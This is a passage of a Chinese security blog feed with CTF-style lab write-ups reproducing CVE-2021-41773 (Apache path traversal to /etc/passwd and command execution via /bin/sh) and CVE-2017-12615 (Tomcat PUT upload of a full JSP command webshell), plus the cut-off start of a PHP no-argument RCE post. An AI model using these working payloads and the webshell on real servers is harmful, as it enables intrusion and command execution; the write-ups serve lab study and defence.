中对路径规范化所做的更改中发现了一个缺陷。攻击者可以使用路径遍历攻击将 URL 映射到预期文档根目录之外的文件，如果文档根目录之外的文件不受 “要求全部拒绝” 的保护，则这些请求可能会成功，如果还为这些别名路径启用了 CGI 脚本，则可以允许远程代码执行。</p>\n<h2 id=\"漏洞条件\"><a class=\"markdownIt-Anchor\" href=\"#漏洞条件\">#</a> 漏洞条件：</h2>\n<p>​\t配置目录遍历，并且开启 cgi mode 2.Apache HTTPd 版本为 2.4.49/2.4.50 3. 存在 cgi-bin 和 icons 文件夹</p>\n<p>​\t穿越的目录允许被访问，比如配置了<Directory />Require all granted</Directory>。（默认情况下是不允许的：<Directory />Require all denied</Directory>）</p>\n<p><strong>注意：这里的 /icons/ 必须是一个存在且可访问的目录</strong></p>\n<h2 id=\"漏洞复现\"><a class=\"markdownIt-Anchor\" href=\"#漏洞复现\">#</a> 漏洞复现：</h2>\n<p>​\t首先，需要在虚拟机里下载一个 docker，可以通过</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apt install docker.io docker-compose</span><br></pre></td></tr></table></figure>\n<p>来安装。</p>\n<p>​\t之后，需要下载 vulhub 的环境</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git clone https://github.com/vulhub/vulhub.git</span><br></pre></td></tr></table></figure>\n<p>​\t之后就可以在 vulhub 这个文件夹下的 httpd 找到漏洞编号 CVE-2021-41773 了，然后执行如下命令</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker-compose up -d</span><br></pre></td></tr></table></figure>\n<p>即可搭建完成，之后根据它开放的 端口来访问这个服务，</p>\n<p><img data-src=\"https://img-blog.csdnimg.cn/direct/847d5ca0e8dc41a383d84062fea18298.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>​\t出现这个页面则表示搭建成功了，之后就可以开始了。</p>\n<p>​\t首先，抓包，然后修改请求包如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET /icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1</span><br><span class=\"line\">Host: 192.168.209.130:8080</span><br><span class=\"line\">Cache-Control: max-age=0</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36</span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class=\"line\">If-None-Match: &quot;2d-432a5e4a73a80&quot;</span><br><span class=\"line\">If-Modified-Since: Mon, 11 Jun 2007 18:53:14 GMT</span><br><span class=\"line\">Connection: close</span><br></pre></td></tr></table></figure>\n<p>​\t可以看到，我们请求的路径为 /icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd , 那么，为啥这个路径能行呢？可以参考这篇文章：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2VjcnNzLmNvbS9hcnRpY2xlcy8zNDg5MA==\">Apache HTTP Server 路径穿越漏洞 (CVE-2021-41773) 分析复现</span>。说白了就是没有对目录进行有效的过滤，导致了可以造成目录穿越直接读取根目录的文件，不过，有的时候可能存在一些个问题，可能需要对 %2e 进行二次 url 编码，这里只是提一句。</p>\n<p>​\t发送了请求之后我们能够拿到这个回显：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HTTP/1.1 200 OK</span><br><span class=\"line\">Date: Mon, 17 Jun 2024 12:20:37 GMT</span><br><span class=\"line\">Server: Apache/2.4.49 (Unix)</span><br><span class=\"line\">Last-Modified: Mon, 27 Sep 2021 00:00:00 GMT</span><br><span class=\"line\">ETag: &quot;39e-5cceec7356000&quot;</span><br><span class=\"line\">Accept-Ranges: bytes</span><br><span class=\"line\">Content-Length: 926</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\"></span><br><span class=\"line\">root:x:0:0:root:/root:/bin/bash</span><br><span class=\"line\">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class=\"line\">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class=\"line\">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class=\"line\">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class=\"line\">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class=\"line\">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class=\"line\">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class=\"line\">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class=\"line\">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class=\"line\">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class=\"line\">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class=\"line\">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class=\"line\">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class=\"line\">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class=\"line\">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class=\"line\">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class=\"line\">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class=\"line\">_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span><br></pre></td></tr></table></figure>\n<p>​\t证明我们成功了，成功读取了文件。</p>\n<p>​\t难道，只能这样了吗？</p>\n<h2 id=\"命令执行\"><a class=\"markdownIt-Anchor\" href=\"#命令执行\">#</a> 命令执行：</h2>\n<p>​\t当然不是，在服务器开启 cgi 或 cgid 模块的情况下，该漏洞可执行任意命令。</p>\n<p>​\t如果，当我们修改文件路径为：/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh  时，就会发现，我们输入的 POST 参数会被当做命令进行执行，也就是说，我们直接做到了 RCE 。</p>\n<p>​\t给个原因。</p>\n<blockquote>\n<p>也就是说，通过 POST 传入的 参数，会作为  <code>stdin</code>  的内容，交给 所访问的 cgi 程序处理</p>\n<p>如果访问的是  <code>/bin/sh</code>  ，那么就能直接 getshell 了</p>\n</blockquote>\n<p>​\t我们给 POST 传入（固定格式） <code>echo Content-Type: text/plain; echo; ls /</code> ，之后就会发现我们成功读取了文件，我提前在根目录存放了 flag 文件，当作一个 ctf 题目来表明我们做对了这个题。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HTTP/1.1 200 OK</span><br><span class=\"line\">Date: Mon, 17 Jun 2024 12:50:01 GMT</span><br><span class=\"line\">Server: Apache/2.4.49 (Unix)</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Content-Type: text/plain</span><br><span class=\"line\">Content-Length: 90</span><br><span class=\"line\"></span><br><span class=\"line\">bin</span><br><span class=\"line\">boot</span><br><span class=\"line\">dev</span><br><span class=\"line\">etc</span><br><span class=\"line\">flag</span><br><span class=\"line\">home</span><br><span class=\"line\">lib</span><br><span class=\"line\">lib64</span><br><span class=\"line\">media</span><br><span class=\"line\">mnt</span><br><span class=\"line\">opt</span><br><span class=\"line\">proc</span><br><span class=\"line\">root</span><br><span class=\"line\">run</span><br><span class=\"line\">sbin</span><br><span class=\"line\">srv</span><br><span class=\"line\">sys</span><br><span class=\"line\">tmp</span><br><span class=\"line\">usr</span><br><span class=\"line\">var</span><br></pre></td></tr></table></figure>\n<p>​\t之后我们 POST 传入： <code>echo Content-Type: text/plain; echo; cat /flag</code> ，最后能够拿到 flag：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HTTP/1.1 200 OK</span><br><span class=\"line\">Date: Mon, 17 Jun 2024 12:52:04 GMT</span><br><span class=\"line\">Server: Apache/2.4.49 (Unix)</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Content-Type: text/plain</span><br><span class=\"line\">Content-Length: 21</span><br><span class=\"line\"></span><br><span class=\"line\">flag&#123;CVE-2021-41773&#125;</span><br></pre></td></tr></table></figure>\n<h1 id=\"tomcat文件上传\"><a class=\"markdownIt-Anchor\" href=\"#tomcat文件上传\">#</a> Tomcat 文件上传：</h1>\n<h2 id=\"前置知识\"><a class=\"markdownIt-Anchor\" href=\"#前置知识\">#</a> 前置知识：</h2>\n<p>​\t<strong>PUT 请求是向服务器端发送数据的，从而改变信息</strong>，该请求就像数据库的 update 操作一样，用来修改数据的内容，但是不会增加数据的种类等，也就是说无论进行多少次 PUT 操作，其结果并没有不同。</p>\n<p>​\tweb.xml 主要用来配置 Filter、Listener、Servlet 等。当 readonly 是 true 的话，那么 PUT 和 DELETE 方法是被拒绝的，因此如果手动将 readonly 选项开启为 false，那么就能够通过 PUT 方法上传文件了。</p>\n<h2 id=\"漏洞复现-2\"><a class=\"markdownIt-Anchor\" href=\"#漏洞复现-2\">#</a> 漏洞复现：</h2>\n<p>​\tvulhub 文件夹中的 tomcat 的 CVE-2017-12615 就是漏洞复现的环境。</p>\n<p>​\t可以在当前文件夹中使用：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker-compose build</span><br><span class=\"line\">docker-compose up -d</span><br></pre></td></tr></table></figure>\n<p>来启动环境。</p>\n<p>​\t访问了之后是如下这个情况：</p>\n<p><img data-src=\"https://img-blog.csdnimg.cn/direct/9ff98e223dc349098074ad96f83457fa.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>​\t那么，首先我们在 docker 里查看我们的题目环境是怎么样的，可以发现 readonly 的值就是 false：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">  <span class=\"comment\">&lt;!--   readonly            Is this context &quot;read only&quot;, so HTTP           --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">init-param</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">param-name</span>&gt;</span>readonly<span class=\"tag\">&lt;/<span class=\"name\">param-name</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">param-value</span>&gt;</span>false<span class=\"tag\">&lt;/<span class=\"name\">param-value</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">init-param</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>​\t那么，我们就可以通过 PUT 传参来更新文件，大概 http 请求如下：</p>\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">PUT</span> <span class=\"string\">/1.jsp</span> <span class=\"meta\">HTTP/1.1</span></span><br><span class=\"line\"><span class=\"attribute\">Host</span><span class=\"punctuation\">: </span>192.168.209.130:8080</span><br><span class=\"line\"><span class=\"attribute\">Upgrade-Insecure-Requests</span><span class=\"punctuation\">: </span>1</span><br><span class=\"line\"><span class=\"attribute\">User-Agent</span><span class=\"punctuation\">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36</span><br><span class=\"line\"><span class=\"attribute\">Accept</span><span class=\"punctuation\">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class=\"line\"><span class=\"attribute\">Accept-Encoding</span><span class=\"punctuation\">: </span>gzip, deflate</span><br><span class=\"line\"><span class=\"attribute\">Accept-Language</span><span class=\"punctuation\">: </span>zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class=\"line\"><span class=\"attribute\">Connection</span><span class=\"punctuation\">: </span>close</span><br><span class=\"line\"><span class=\"attribute\">Content-Type</span><span class=\"punctuation\">: </span>application/x-www-form-urlencoded</span><br><span class=\"line\"><span class=\"attribute\">Content-Length</span><span class=\"punctuation\">: </span>4</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"language-bash\"><span class=\"built_in\">test</span></span></span><br></pre></td></tr></table></figure>\n<p>​\t这里发现无法上传，报错是 405–Method Not Allowed，查资料说的是后缀不允许，所以在 / 1.jsp 后面加上 %20 再试试，结果如下：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HTTP/1.1 204 </span><br><span class=\"line\">Date: Mon, 17 Jun 2024 13:40:05 GMT</span><br><span class=\"line\">Connection: close</span><br></pre></td></tr></table></figure>\n<p>​\t应该是上传成功了，访问下这个文件试试；</p>\n<p><img data-src=\"https://img-blog.csdnimg.cn/direct/26fdf3232c614210abcf5538ccccad2a.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>​\t能访问到，说明这里就上传成功了，那么，接下来上传 jsp 马，如下：</p>\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">PUT</span> <span class=\"string\">/1.jsp%20</span> <span class=\"meta\">HTTP/1.1</span></span><br><span class=\"line\"><span class=\"attribute\">Host</span><span class=\"punctuation\">: </span>192.168.209.130:8080</span><br><span class=\"line\"><span class=\"attribute\">Upgrade-Insecure-Requests</span><span class=\"punctuation\">: </span>1</span><br><span class=\"line\"><span class=\"attribute\">User-Agent</span><span class=\"punctuation\">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36</span><br><span class=\"line\"><span class=\"attribute\">Accept</span><span class=\"punctuation\">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class=\"line\"><span class=\"attribute\">Accept-Encoding</span><span class=\"punctuation\">: </span>gzip, deflate</span><br><span class=\"line\"><span class=\"attribute\">Accept-Language</span><span class=\"punctuation\">: </span>zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class=\"line\"><span class=\"attribute\">Connection</span><span class=\"punctuation\">: </span>close</span><br><span class=\"line\"><span class=\"attribute\">Content-Type</span><span class=\"punctuation\">: </span>application/x-www-form-urlencoded</span><br><span class=\"line\"><span class=\"attribute\">Content-Length</span><span class=\"punctuation\">: </span>635</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"language-vbscript-html\"><span class=\"language-vbscript\">&lt;%@ page import=<span class=\"string\">&quot;java.io.InputStream&quot;</span> %&gt;</span><span class=\"language-xml\"></span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-vbscript-html\"></span><span class=\"language-vbscript\">&lt;%@ page import=<span class=\"string\">&quot;java.io.BufferedReader&quot;</span> %&gt;</span><span class=\"language-xml\"></span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-vbscript-html\"></span><span class=\"language-vbscript\">&lt;%@ page import=<span class=\"string\">&quot;java.io.InputStreamReader&quot;</span> %&gt;</span><span class=\"language-xml\"></span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-vbscript-html\"></span><span class=\"language-vbscript\">&lt;%@ page contentType=<span class=\"string\">&quot;text/html;charset=UTF-8&quot;</span> language=<span class=\"string\">&quot;java&quot;</span> %&gt;</span><span class=\"language-xml\"></span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-vbscript-html\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-vbscript-html\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-vbscript-html\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>一句话木马<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-vbscript-html\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-vbscript-html\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-vbscript-html\"></span><span class=\"language-vbscript\">&lt;%</span></span></span><br><span class=\"line\"><span class=\"language-vbscript\"><span class=\"language-vbscript-html\">  Process process = Runtime.getRun<span class=\"built_in\">time</span>().exec(<span class=\"built_in\">request</span>.getParameter(<span class=\"string\">&quot;cmd&quot;</span>));</span></span></span><br><span class=\"line\"><span class=\"language-vbscript\"><span class=\"language-vbscript-html\">  InputStream inputStream = process.getInputStream();</span></span></span><br><span class=\"line\"><span class=\"language-vbscript\"><span class=\"language-vbscript-html\">  BufferedReader bufferedReader =  <span class=\"keyword\">new</span> BufferedReader(<span class=\"keyword\">new</span> InputStreamReader(inputStream));</span></span></span><br><span class=\"line\"><span class=\"language-vbscript\"><span class=\"language-vbscript-html\">  String line;</span></span></span><br><span class=\"line\"><span class=\"language-vbscript\"><span class=\"language-vbscript-html\">  <span class=\"keyword\">while</span> ((line = bufferedReader.readLine())!=<span class=\"literal\">null</span>)&#123;</span></span></span><br><span class=\"line\"><span class=\"language-vbscript\"><span class=\"language-vbscript-html\">     <span class=\"built_in\">response</span>.getWriter().pr<span class=\"built_in\">int</span>(line);</span></span></span><br><span class=\"line\"><span class=\"language-vbscript\"><span class=\"language-vbscript-html\">    &#125;</span></span></span><br><span class=\"line\"><span class=\"language-vbscript\"><span class=\"language-vbscript-html\">%&gt;</span><span class=\"language-xml\"></span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-vbscript-html\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"language-vbscript-html\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span></span></span><br></pre></td></tr></table></figure>\n<p>​\t这里很明显可以得知木马的参数为 cmd，所以访问之后直接传递 cmd 的参数即可执行命令，cmd=cat /flag：</p>\n<p><img data-src=\"https://img-blog.csdnimg.cn/direct/14260754e6a041acb01c6ac27facfab6.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n",
            "tags": [
                "CVE",
                "Web"
            ]
        },
        {
            "id": "http://blog.g01den.top/posts/88915f6f.html",
            "url": "http://blog.g01den.top/posts/88915f6f.html",
            "title": "无参数RCE的一些奇技淫巧",
            "date_published": "2024-04-06T11:06:19.000Z",
            "content_html": "<h1 id=\"简述\"><a class=\"markdownIt-Anchor\" href=\"#简述\">#</a> 简述：</h1>\n<p>​\t首先说一下什么是无参数 RCE，对于很多时候，我们通常遇到 PHP 中存在 eval 函数的时候，一般是通过构造：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"title function_ invoke__\">system</span>(<span class=\"string\">&quot;cat /flag&quot;</span>);</span><br></pre></td></tr></table></figure>\n<p>​\t的 payload 来实行攻击的，大不了就出现了一些 waf 需要绕过。但是，有的时候，他们相关的 waf 特别奇葩，像是过滤了所有的字母以及数字什么的，另外，就是这篇博客最主要说明的题目，就是无参数 RCE：</p>\n<p>​\t像是下面的这一个正则：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"string\">&#x27;;&#x27;</span> === <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"string\">&#x27;/[^\\W]+\\((?R)?\\)/&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>, <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;star&#x27;</span>])) &#123;    </span><br><span class=\"line\">    <span class=\"keyword\">eval</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;star&#x27;</span>]);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t经过了它的过滤之后，最后只有 a (b (c ()));\t这样的 payload 才不会被过滤了。</p>\n<blockquote>\n<p>正则表达式 [^\\W]+((?R)?) 匹配了一个或多个非标点符号字符（表示函数名），后跟一个括号（表示函数调用）。其中 (?R) 是递归引用，它只能匹配和替换嵌套的函数调用，而不能处理函数参数。使用该正则表达式进行替换后，每个函数调用都会被删除，只剩下一个分号；，而最终结果强等于；时，payload 才能进行下一步。简而言之，无参数 rce 就是不使用参数，而只使用一个个函数最终达到目的。</p>\n</blockquote>\n<h1 id=\"相关函数讲解\"><a class=\"markdownIt-Anchor\" href=\"#相关函数讲解\">#</a> 相关函数讲解：</h1>\n<blockquote>\n<ul>\n<li>scandir () : 将返回当前目录中的所有文件和目录的列表。返回的结果是一个数组，其中包含当前目录下的所有文件和目录名称（glob () 可替换）</li>\n<li>localeconv () ：返回一包含本地数字及货币格式信息的数组。（但是这里数组第一项就是‘.’，这个。的用处很大）</li>\n<li>current () ：返回数组中的单元，默认取第一个值。pos () 和 current () 是同一个东西</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zby5jc2RuLm5ldC9zby9zZWFyY2g/cT1nZXRjd2QmYW1wO3NwbT0xMDAxLjIxMDEuMzAwMS43MDIw\">getcwd</span> () : 取得当前工作目录</li>\n<li>dirname (): 函数返回路径中的目录部分</li>\n<li>array_flip () : 交换数组中的键和值，成功时返回交换后的数组</li>\n<li>array_rand () : 从数组中随机取出一个或多个单元</li>\n<li>array_reverse (): 将数组内容反转</li>\n<li>strrev (): 用于反转给定字符串</li>\n<li>getcwd ()：获取当前工作目录路径</li>\n<li>dirname () ：函数返回路径中的目录部分。</li>\n<li>chdir () ：函数改变当前的目录。</li>\n<li>eval ()、assert ()：命令执行</li>\n<li>hightlight_file ()、show_source ()、readfile ()：读取文件内容</li>\n</ul>\n</blockquote>\n<p>​\t数组移动操作：</p>\n<blockquote>\n<ul>\n<li>end () ： 将内部指针指向数组中的最后一个元素，并输出</li>\n<li>next () ：将内部指针指向数组中的下一个元素，并输出</li>\n<li>prev () ：将内部指针指向数组中的上一个元素，并输出</li>\n<li>reset () ： 将内部指针指向数组中的第一个元素，并输出</li>\n<li>each () ： 返回当前元素的键名和键值，并将内部指针向前移动</li>\n</ul>\n</blockquote>\n<h1 id=\"题目示例gxyctf-2019禁止套娃\"><a class=\"markdownIt-Anchor\" href=\"#题目示例gxyctf-2019禁止套娃\">#</a> 题目示例：[GXYCTF 2019] 禁止套娃</h1>\n<p>​\t先说题目，首先是一个信息搜集，不过这个信息搜集通过多次尝试或者扫后台发现了.git/ 文件夹，猜测是 git 泄露，直接 Githack 下源码，得到 index.php 的内容：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">D:\\c\\python tools\\GitHack&gt;python GitHack.py http://node4.anna.nssctf.cn:28131/.git</span><br><span class=\"line\">[+] Download and parse index file ...</span><br><span class=\"line\">[+] flag.php</span><br><span class=\"line\">[+] index.php</span><br><span class=\"line\">[OK] flag.php</span><br><span class=\"line\">[OK] index.php</span><br></pre></td></tr></table></figure>\n<p>​\t之后得到 Index.php 源码如下：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">&quot;flag.php&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;exp&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/data:\\/\\/|filter:\\/\\/|php:\\/\\/|phar:\\/\\//i&#x27;</span>, <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;exp&#x27;</span>])) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"string\">&#x27;;&#x27;</span> === <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"string\">&#x27;/[a-z,_]+\\((?R)?\\)/&#x27;</span>, 